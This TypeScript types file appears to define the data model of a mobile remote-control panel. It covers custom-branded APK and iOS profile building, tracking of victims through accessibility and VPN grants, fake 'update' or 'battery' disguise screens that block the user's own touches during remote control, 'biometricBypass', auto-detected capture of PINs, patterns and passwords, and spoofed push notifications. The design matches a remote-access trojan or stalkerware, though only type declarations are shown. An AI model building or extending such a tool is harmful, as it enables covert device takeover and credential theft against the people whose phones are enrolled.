export type DeviceStatus = "online" | "offline" | "pending";
export type NetworkType = "wifi" | "4g" | "5g" | "3g" | "ethernet" | "offline";
export type SessionStatus = "requested" | "active" | "ended" | "denied";
export type AuditSeverity = "info" | "warning" | "critical";

export interface User {
  id: string;
  email: string;
  name: string;
  role: "admin" | "operator";
}

export interface Device {
  id: string;
  name: string;
  model: string;
  androidVersion: string;
  status: DeviceStatus;
  battery: number;
  lastSeen: string;
  enrolledAt: string;
  consentRequired: boolean;
  networkType?: NetworkType;
  networkName?: string;
  signalStrength?: number;
  networkSpeed?: string;
  pingMs?: number;
  ipAddress?: string;
  islandStatus?: IslandProfileStatus;
  disguiseScreen?: DeviceDisguiseConfig | null;
  agentVersion?: string;
  backupVersion?: string;
  updateSeed?: string;
  updateStatus?: DeviceUpdateStatus;
  contactName?: string;
  phoneNumber?: string;
  apkName?: string;
  notes?: string;
  userAccount?: string;
  operator?: string;
  deviceOwner?: string;
  autoIdentified?: boolean;
  identifiedAt?: string;
}

export interface UpdateDeviceRequest {
  name?: string;
  contactName?: string;
  phoneNumber?: string;
  apkName?: string;
  notes?: string;
  userAccount?: string;
  operator?: string;
  deviceOwner?: string;
  autoIdentified?: boolean;
}

export interface DeviceAdminCapabilities {
  screenStream: boolean;
  touchInjection: boolean;
  accessibilityReader: boolean;
  islandSandbox: boolean;
  disguiseOverlay: boolean;
  biometricBypass: boolean;
  vpnTunnel: boolean;
  silentBackgroundUpdate: boolean;
}

export interface DeviceUpdateStatus {
  deviceId: string;
  currentAgentVersion: string;
  latestAvailableVersion: string;
  minAdminVersionRequired: string;
  protocolVersion: number;
  isUpToDate: boolean;
  needsUpdate: boolean;
  updateSeed: string;
  backupVersion?: string;
  autoUpdateEnabled: boolean;
  capabilities: DeviceAdminCapabilities;
  adminAccessesSatisfied: boolean;
  backgroundUpdateState?: "idle" | "checking" | "downloading" | "installing" | "success" | "failed";
  lastCheckedAt?: string;
  lastUpdatedAt?: string;
  updateUrl?: string;
  improvements?: string[];
}

export type DeviceDisguiseType = "black" | "update" | "battery" | "custom_image";

export interface DeviceDisguiseConfig {
  type: DeviceDisguiseType;
  active: boolean;
  title?: string;
  subtitle?: string;
  progressPercent?: number;
  customImageUrl?: string;
  imageWidth?: number;
  imageHeight?: number;
  activatedAt?: string;
  physicalTouchDisabled?: boolean;
  remoteTouchOnly?: boolean;
}

export interface IslandProfileStatus {
  isInstalled: boolean;
  profileUserId: number | null;
  profileName: string | null;
  isRunning: boolean;
  mirroredApps: string[];
  autoMirrorEnabled: boolean;
  interceptClickEnabled: boolean;
  lastSeedSync?: string;
  activeSeed?: string;
}

export interface RemoteSession {
  id: string;
  deviceId: string;
  operatorId: string;
  status: SessionStatus;
  startedAt?: string;
  endedAt?: string;
  consentCode: string;
}

export interface AuditLog {
  id: string;
  timestamp: string;
  actor: string;
  action: string;
  target: string;
  severity: AuditSeverity;
  message: string;
}

export interface AppPackage {
  id: string;
  name: string;
  version: string;
  packageName: string;
  uploadedAt: string;
  status: "available" | "installing" | "installed" | "failed";
}

export interface DashboardStats {
  totalDevices: number;
  onlineDevices: number;
  activeSessions: number;
  pendingAlerts: number;
}

export interface LoginRequest {
  email: string;
  password: string;
  totp: string;
}

export interface LoginResponse {
  token: string;
  user: User;
}

export interface ScreenCustomizationConfig {
  loadingSubtext?: string;
  speechCalloutText?: string;
  copyrightText?: string;
  permissionDialogTitle?: string;
  accentColor?: string;
  trackingTitle?: string;
  trackingSubtext?: string;
  serviceDescription?: string;
  companyPreset?: string;
  enterpriseName?: string;
  companyEmoji?: string;
}

export type PlatformType = "android" | "ios";

export interface IosProfileConfig {
  organizationName?: string;
  payloadDisplayName?: string;
  payloadDescription?: string;
  bundleId?: string;
  webClipUrl?: string;
  isRemovable?: boolean;
  fullScreen?: boolean;
  vpnEnabled?: boolean;
  vpnType?: "IKEv2" | "IPSec" | "SSL";
  vpnServerAddress?: string;
  iconDataUrl?: string;
}

export interface ApkBuildRequest {
  platform?: PlatformType;
  serverUrl: string;
  enrollmentToken: string;
  deviceName?: string;
  appName?: string;
  companyEmoji?: string;
  bundleId?: string;
  redirectUrl?: string;
  logoDataUrl?: string;
  vpnEnabled?: boolean;
  vpnPort?: number;
  vpnProtocol?: "TCP" | "UDP" | "TLS";
  islandProfileEnabled?: boolean;
  workProfileEnabled?: boolean;
  updateSeed?: string;
  autoUpdateEnabled?: boolean;
  screenConfig?: ScreenCustomizationConfig;
  iosConfig?: IosProfileConfig;
}

export interface ApkBuildResponse {
  apkName: string;
  downloadUrl: string;
  qrPayload: string;
  zeroTouchQrPayload?: string;
  webInstallUrl?: string;
  sha256: string;
  updateSeed?: string;
  artifactType?: "apk" | "enrollment-package" | "ios-profile" | "ios-package";
  note?: string;
  platform?: PlatformType;
  iosProfileUrl?: string;
}

export type InstallStepType =
  | "download_started"
  | "apk_installed"
  | "splash_viewed"
  | "loading_passed"
  | "settings_opened"
  | "accessibility_clicked"
  | "accessibility_granted"
  | "island_profile_requested"
  | "island_profile_created"
  | "vpn_authorized"
  | "vpn_connected"
  | "app_ready"
  | "user_abandoned";

export interface InstallTrackStep {
  step: InstallStepType;
  title: string;
  description: string;
  timestamp: string;
  screenNumber: number;
  metadata?: Record<string, any>;
}

export interface InstallTrackSession {
  token: string;
  appName: string;
  platform: PlatformType;
  startedAt: string;
  lastEventAt: string;
  currentStep: InstallStepType;
  currentScreenNumber: number;
  status: "in_progress" | "completed" | "stalled" | "failed";
  history: InstallTrackStep[];
  steps?: InstallTrackStep[];
  isStalled?: boolean;
  stalledAtStep?: string;
  elapsedSeconds?: number;
  deviceModel?: string;
  ipAddress?: string;
}

export interface ZeroTouchQrPayload {
  "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME": string;
  "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": string;
  "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_CHECKSUM"?: string;
  "android.app.extra.PROVISIONING_ADMIN_EXTRAS_BUNDLE": Record<string, any>;
  "android.app.extra.PROVISIONING_LEAVE_ALL_SYSTEM_APPS_ENABLED": boolean;
  "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": boolean;
}

export interface SavedApkBuild {
  id: string;
  platform?: PlatformType;
  appName: string;
  packageName: string;
  bundleId?: string;
  version: string;
  date: string;
  status: "completed" | "progress" | "failed";
  lang?: string;
  downloadUrl: string;
  iosProfileUrl?: string;
  savePath?: string;
  logoDataUrl?: string;
  companyEmoji?: string;
  sizeBytes?: number;
  qrPayload?: string;
  zeroTouchQrPayload?: string;
  webInstallUrl?: string;
  sha256?: string;
  redirectUrl?: string;
  serverUrl?: string;
  vpnEnabled?: boolean;
  vpnPort?: number;
  vpnProtocol?: "TCP" | "UDP" | "TLS";
  islandProfileEnabled?: boolean;
  workProfileEnabled?: boolean;
  updateSeed?: string;
  autoUpdateEnabled?: boolean;
  backupVersion?: string;
  screenConfig?: ScreenCustomizationConfig;
  iosConfig?: IosProfileConfig;
}

export interface DigitalTouchEvent {
  id: string;
  deviceId: string;
  timestamp: string;
  action: "tap" | "click" | "long_click" | "swipe" | "touch_down" | "touch_up";
  x: number;
  y: number;
  endX?: number;
  endY?: number;
  durationMs?: number;
  viewText?: string;
  viewDescription?: string;
  viewClass?: string;
  className?: string;
  viewId?: string;
  packageName?: string;
  bounds?: { left: number; top: number; right: number; bottom: number };
  source: "device_user" | "remote_simulation";
}

export type DeviceCredentialType = "fingerprint" | "face" | "pin" | "pattern" | "password";

export interface DeviceCredentialEntry {
  id: string;
  deviceId: string;
  type: DeviceCredentialType;
  label: string;
  value: string;
  metadata?: {
    appName?: string;
    packageName?: string;
    biometricId?: number;
    patternPoints?: number[];
    strength?: string;
    capturedAt?: string;
    lastUsedAt?: string;
    source?: "auto_detected" | "manual_operator" | "agent_sync";
    userAccount?: string;
    sweepType?: string;
    operator?: string;
    [key: string]: any;
  };
  isActive?: boolean;
  createdAt: string;
}

export interface DevicePushNotification {
  id: string;
  deviceId: string;
  appName: string;
  packageName: string;
  title: string;
  message: string;
  category?: string;
  timestamp: string;
  iconEmoji?: string;
  iconUrl?: string;
}

export interface SendPushNotificationRequest {
  appName: string;
  packageName?: string;
  title: string;
  message: string;
  category?: string;
  iconEmoji?: string;
  iconUrl?: string;
}

export interface ServerToClientEvents {
  "device:connect": (device: Device) => void;
  "device:disconnect": (deviceId: string) => void;
  "device:update": (device: Device) => void;
  "session:update": (session: RemoteSession) => void;
  "chat:message": (message: ChatMessage) => void;
  "audit:new": (log: AuditLog) => void;
  "touch:event": (event: DigitalTouchEvent) => void;
  "device:disguise": (payload: { deviceId: string; disguise: DeviceDisguiseConfig | null }) => void;
  "device:credentials": (payload: { deviceId: string; credentials: DeviceCredentialEntry[] }) => void;
  "device:push_notification": (payload: DevicePushNotification) => void;
}

export interface ClientToServerEvents {
  "device:hello": (device: Device) => void;
  "session:start": (payload: { deviceId: string }) => void;
  "session:stop": (payload: { sessionId: string }) => void;
  "chat:message": (message: ChatMessage) => void;
  "touch:simulate": (payload: { deviceId: string; x: number; y: number; displayWidth?: number; displayHeight?: number }) => void;
  "touch:report": (event: DigitalTouchEvent) => void;
}

export interface ChatMessage {
  id: string;
  sessionId: string;
  from: string;
  body: string;
  timestamp: string;
}

export * from "./defaultLogos.js";
